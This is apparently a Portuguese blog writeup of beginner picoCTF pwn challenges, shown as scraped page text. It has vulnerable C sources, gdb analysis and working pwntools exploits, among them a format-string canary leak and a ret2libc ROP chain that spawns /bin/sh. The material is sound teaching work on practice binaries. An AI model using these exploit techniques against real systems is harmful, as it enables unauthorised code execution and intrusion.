bytes report. Se fizermos um teste, podemos verificar que realmente podemos sobrescrever o endereço de retorno (e, consequentemente, o stack cookie ;;)\nVamos abri-lo no gdb e inserir um ponto de interrupção antes da verificação do stack cookie (__stack_chk_fail@plt). Estou colocando o ponto de interrupção na instrução mov rdx, QWORD PTR [rbp-0x8]. Vamos também usar o comando pattern create para gerar um padrão para nossa entrada e ver onde as coisas estão dando errado.\nIsso é o que eu vejo dentro do registrador rdx: $rdx : 0x616161616161616a (\"jaaaaaaa\"?) (poderíamos também verificar o valor de rbp-0x8 usando o comando x/gx $rbp-0x8) Verificando a posição do offset:\n1 2 3 gef➤ pattern offset 0x616161616161616a [+] Searching for '6a61616161616161'/'616161616161616a' with period=8 [+] Found at offset 72 (little-endian search) likely Isso significa que precisamos usar a parte do padrão 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa' para alcançar o stack cookie. Depois disso, escrevemos o stack cookie que foi recuperado usando a vulnerabilidade de format string e escrevemos qualquer coisa no rbp, não importa. Depois de tudo isso, finalmente podemos escrever no endereço de retorno sem problemas.\nMas para onde retornamos?\nNão temos nenhuma função interessante em nosso programa que poderia executar algo para nós. O que temos, no entanto, é um endereço da libc no endereço de retorno. Como temos PIE e ASLR ativados, esse endereço será randomizado toda vez, mas sempre será a mesma instrução. Nesse caso, precisamos apenas calcular o offset da instrução sendo executada considerando o ponto de entrada como referência. Vamos usar o gdb para alcançar isso\nO endereço destacado é o endereço de retorno. Vamos ver para onde isso nos leva\nIsso nos leva para __libc_start_main+235. Agora precisamos verificar qual é o offset dessa instrução quando o programa não está em execução. Então você pode abrir o arquivo libc dentro do gdb. Eu o abri, disassemblei a __libc_start_main e comecei a procurar pela instrução específica __libc_start_main+235.\nLá está :) Está no endereço 0x000000000002409b, então está no offset 0x2409b após o entrypoint da libc. Agora podemos usar o endereço da libc que vazamos anteriormente e subtrair 0x2409b dele para encontrar o endereço do entrypoint da libc mesmo quando o programa está em execução!\nAqui está o cálculo:\n1 2 libc_start_main_offset = 0x000000000002409b libc_entrypoint = libc_leak - libc_start_main_offset Agora podemos escolher qualquer endereço da libc para pular. Vamos ver se conseguimos executar a função system e passar o argumento /bin/sh para obter uma shell.\nProcurando o offset de system dentro da libc:\nsystem está no offset 0x44af0. Vamos salvar isso:\n1 system_offset = 0x44af0 \"/bin/sh\" está no offset 18052c:\n1 bin_sh_offset = 0x18052c Então sabemos o endereço de system e o endereço da string \"/bin/sh\". No entanto, precisamos colocar a string \"/bin/sh\" no registrador rdi ao chamar a função system. Podemos conseguir isso usando ROP. Vamos procurar alguns gadgets usando ROPgadget\nO comando é: ROPgadget --binary libc.so.6 --ropchain | grep \"pop rdi\" [+] Gadget found: 0x23a5f pop rdi ; ret Vamos também salvá-lo:\n1 pop_rdi_ret_offset = 0x23a5f Ótimo! Isso é tudo o que precisamos :)\nEm conclusão, estamos preenchendo todo o buffer report, sobrescrevendo o stack cookie, colocando qualquer coisa no registrador rbp, sobrescrevendo o endereço de retorno com a instrução pop rdi ; ret para colocar a string \"/bin/sh\" no registrador rdi, colocando o endereço da string \"/bin/sh\" (o entrypoint da libc + o offset que encontramos) logo depois para que pop rdi funcione corretamente, e então colocando o endereço de system (o entrypoint da libc + o endereço que encontramos) depois para que ret retorne para ele :)\nEsta é a minha solução para este desafio:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 from pwn import * libc_start_main_offset = 0x000000000002409b pop_rdi_ret_offset = 0x23a5f system_offset = 0x44af0 bin_sh_offset = 0x18052c p = process(\"./admin-panel_patched\") p.recvline() p.recvline() p.sendline(b\"admin\") p.recvline() p.sendline(b'secretpass123aaaaaaaaaaaaaaaaaaa%15$p,%17$p') p.recvline() leak_addr = p.recvline().decode()[:-1].split(',') stack_cookie = int(leak_addr[0], 16) libc_leak = int(leak_addr[1], 16) print(f\"stack cookie is: {hex(stack_cookie)}\") print(f\"leaked address is: {hex(libc_leak)}\") libc_entrypoint = libc_leak - libc_start_main_offset pop_rdi_ret = libc_entrypoint + pop_rdi_ret_offset payload = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa' payload += p64(stack_cookie) payload += p64(0xdeadbeef) payload += p64(pop_rdi_ret) payload += p64(bin_sh_offset + libc_entrypoint) payload += p64(system_offset + libc_entrypoint) p.recvuntil(b'2 or 3:') p.sendline(b'2') p.recvuntil(b'wrong:') p.sendline(payload) p.interactive() É isso. Espero que tenham gostado :)\n","wordCount":"9033","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-08-02T00:00:00Z","dateModified":"2024-08-02T00:00:00-03:00","author":{"@type":"Person","name":"dkvhr"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/blog/2024-08-02-picogym-pwn-easy/"},"publisher":{"@type":"Organization","name":"Blog do GRIS","logo":{"@type":"ImageObject","url":"http://localhost:1313/images/gris-logo-2020%27s_black.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/blog/ title=Blog><span>Blog</span></a></li><li><a href=http://localhost:1313/categories/ title=Categorias><span>Categorias</span></a></li><li><a href=http://localhost:1313/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/blog/>Blogs</a></div><h1 class="post-title entry-hint-parent">Resolvendo os desafios iniciais de pwn do picoCTF</h1><div class=post-description>Esse é um writeup dos 15 desafios iniciais de pwning do picoGym. Você pode encontrar esses desafios em [picoGym](https://play.picoctf.org/practice). Há também um desafio extra no final do post de um outro CTF :)</div><div class=post-meta><span title='2024-08-02 00:00:00 -0300 -03'>August 2, 2024</span>&nbsp;·&nbsp;43 min&nbsp;·&nbsp;9033 words&nbsp;·&nbsp;dkvhr&nbsp;|&nbsp;<a href=https://github.com/grisufrj/grisufrj.github.io/tree/main/content/blog/2024-08-02-picogym-pwn-easy.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><p>Esse é um writeup dos 15 desafios iniciais de pwning do picoGym. Você pode encontrar esses desafios em <a href=https://play.picoctf.org/practice>picoGym</a>. Há também um desafio extra no final do post de um outro CTF :)<br>Vamos começar ^^</p><h2 id=buffer-overflow-0>buffer overflow 0<a hidden class=anchor aria-hidden=true href=#buffer-overflow-0>#</a></h2><p>Nos é dado este arquivo C:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define FLAGSIZE_MAX 64
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>flag</span><span class=p>[</span><span class=n>FLAGSIZE_MAX</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>sigsegv_handler</span><span class=p>(</span><span class=kt>int</span> <span class=n>sig</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>vuln</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>input</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf2</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=nf>strcpy</span><span class=p>(</span><span class=n>buf2</span><span class=p>,</span> <span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>f</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span><span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>f</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s %s&#34;</span><span class=p>,</span> <span class=s>&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;own debugging flag.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fgets</span><span class=p>(</span><span class=n>flag</span><span class=p>,</span><span class=n>FLAGSIZE_MAX</span><span class=p>,</span><span class=n>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>signal</span><span class=p>(</span><span class=n>SIGSEGV</span><span class=p>,</span> <span class=n>sigsegv_handler</span><span class=p>);</span> <span class=c1>// Set up signal handler
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>gid_t</span> <span class=n>gid</span> <span class=o>=</span> <span class=nf>getegid</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>setresgid</span><span class=p>(</span><span class=n>gid</span><span class=p>,</span> <span class=n>gid</span><span class=p>,</span> <span class=n>gid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Input: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf1</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>buf1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>vuln</span><span class=p>(</span><span class=n>buf1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;The program will exit now</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Ao realizar um checksec, obtemos o seguinte resultado:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    Arch:     i386-32-little
</span></span><span class=line><span class=cl>    RELRO:    Full RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      PIE enabled
</span></span></code></pre></td></tr></table></div></div><p>Antes de começar, criei uma flag de debug em um arquivo chamado flag.txt. Dessa forma, podemos fazer o programa rodar localmente.</p><p>Se olharmos o código, o arquivo flag.txt será lido e gravado em <code>char flag[FLAGSIZE]</code>. A única maneira de exibir o conteúdo da flag é acionando a função de sinal. Isso significa que, se causarmos um erro de segmentação, por exemplo, o conteúdo da flag será exibido.</p><p>Felizmente, o programa usa a função <code>gets</code>. Ela escreverá na variável <code>char buf1[100]</code> qualquer coisa que quisermos, sem considerar o tamanho. Se olharmos para a função <code>vuln</code>, veremos que ela copia do argumento de entrada (que será o buf1) para um buffer de tamanho 16.</p><p>Portanto, se sobrescrevermos o endereço de retorno da função <code>vuln</code> com algum valor inválido, isso definitivamente causará um erro de segmentação.</p><p>Você pode simplesmente colocar muitos caracteres <code>A</code> para garantir que o endereço de retorno seja sobrescrito com eles. Eu coloquei <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>. Ao analisar o programa no gdb, podemos ver isso:</p><p><img alt=bof0 loading=lazy src=/images/davi-post-pwn/bof0/bof0.png></p><p>O programa irá travar, pois temos &lsquo;AAAA&rsquo; como endereço de retorno, e isso não é válido. Executando o programa fora do gdb, ele passará pela função sigsegv_handler, que nos dará a flag:</p><p>flag: <code>picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}</code></p><h2 id=buffer-overflow-1>buffer overflow 1<a hidden class=anchor aria-hidden=true href=#buffer-overflow-1>#</a></h2><p>Aqui está o arquivo C fornecido:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;asm.h&#34;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define BUFSIZE 32
</span></span></span><span class=line><span class=cl><span class=cp>#define FLAGSIZE 64
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>win</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>FLAGSIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>f</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span><span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>f</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s %s&#34;</span><span class=p>,</span> <span class=s>&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;own debugging flag.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=n>FLAGSIZE</span><span class=p>,</span><span class=n>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>vuln</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>BUFSIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Okay, time to return... Fingers Crossed... Jumping to 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>get_return_address</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>gid_t</span> <span class=n>gid</span> <span class=o>=</span> <span class=nf>getegid</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>setresgid</span><span class=p>(</span><span class=n>gid</span><span class=p>,</span> <span class=n>gid</span><span class=p>,</span> <span class=n>gid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please enter your string: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>vuln</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Ao realizar um checksec, obtemos o seguinte:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    Arch:     i386-32-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX unknown - GNU_STACK missing
</span></span><span class=line><span class=cl>    PIE:      No PIE (0x8048000)
</span></span><span class=line><span class=cl>    Stack:    Executable
</span></span><span class=line><span class=cl>    RWX:      Has RWX segments
</span></span></code></pre></td></tr></table></div></div><p>Como o binário não possui um stack canary, podemos facilmente sobrescrever o endereço de retorno usando a função <code>gets</code> em <code>vuln()</code>.</p><p>Ao sobrescrever o endereço de retorno da função <code>vuln</code>, precisamos preencher todo o buffer <code>char buf[BUFSIZE]</code>, alguns outros valores intermediários e, em seguida, o endereço de retorno.</p><p>Executei o programa dentro do gdb e usei o comando pattern create -n 4. Também coloquei um ponto de interrupção na instrução ret da função vuln e executei. Quando solicitado por uma entrada, forneci o padrão gerado pelo gdb. Terminamos nesta situação:</p><p><img alt=bof1 loading=lazy src=/images/davi-post-pwn/bof1/bof1.png></p><p>Há algumas coisas importantes aqui.
Observe o endereço impresso na parte superior da tela: <code>Okay, time to return... Fingers Crossed... Jumping to 0x6161616c.</code>
O endereço de retorno impresso aqui é <code>0x6161616c</code>.</p><p>Podemos confirmar isso olhando para a pilha. Temos:
<code>0xffffd14c│+0x0000: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"</code> no topo.</p><p>Os primeiros 4 caracteres são <code>laaa</code>, que em hexadecimal é igual a <code>0x6161616c</code>. Este é o endereço de retorno sendo usado pela função. Isso significa que podemos simplesmente mudar o <code>laaa</code> em nossa entrada para o endereço de retorno que desejamos (no caso, a função <code>win</code>, para que possamos obter a flag).</p><p>Como não temos PIE, podemos simplesmente usar diretamente o endereço da função <code>win</code>, que é <code>0x080491f6</code> (você pode obtê-lo usando o comando <code>disas win</code> no gdb ou colocando o programa em um descompilador como Ghidra).</p><p>Juntando tudo isso, aqui está minha solução usando pwntools:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;i386&#39;</span><span class=p>,</span> <span class=n>os</span> <span class=o>=</span> <span class=s1>&#39;linux&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>saturn</span><span class=o>.</span><span class=n>picoctf</span><span class=o>.</span><span class=n>net</span><span class=p>,</span> <span class=mi>64507</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=nb>int</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mh>0x080491f6</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=s1>&#39;little&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=buffer-overflow-2>buffer overflow 2<a hidden class=anchor aria-hidden=true href=#buffer-overflow-2>#</a></h2><p>Aqui está o código-fonte:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define BUFSIZE 100
</span></span></span><span class=line><span class=cl><span class=cp>#define FLAGSIZE 64
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>win</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>arg1</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>arg2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>FLAGSIZE</span><span class=p>];</span>
